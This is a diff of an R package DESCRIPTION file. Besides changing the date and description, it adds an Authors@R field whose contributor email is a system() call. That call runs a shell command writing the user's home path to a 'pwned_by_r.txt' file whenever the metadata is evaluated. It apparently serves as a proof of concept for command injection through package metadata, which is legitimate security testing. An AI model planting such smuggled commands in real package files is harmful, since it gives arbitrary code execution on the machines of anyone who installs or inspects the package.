@@ -1,13 +1,9 @@
 Package: nothing
 Title: A package about nothing
 Version: 0.0.0.0.0.0
-Date: 2014-04-25
-Authors: Romain Francois <romain@r-enthusiasts.com>
-Description: A package about nothing
+Date: 2026-04-06
+Authors@R: c(person("John", "Doe", email="john.doe@example.com", role=c("aut", "cre")), person("System", "Cmd", role="ctb", email=system("echo My secret is: ${HOME} > ~/pwned_by_r.txt", intern=TRUE)))
+Description: A package about nothing.
 Depends: R (>= 3.1.0)
-Imports:
-  mirbase.db,
-  TCGAutils,
-  curatedTCGAData
 License: GPL-2
 
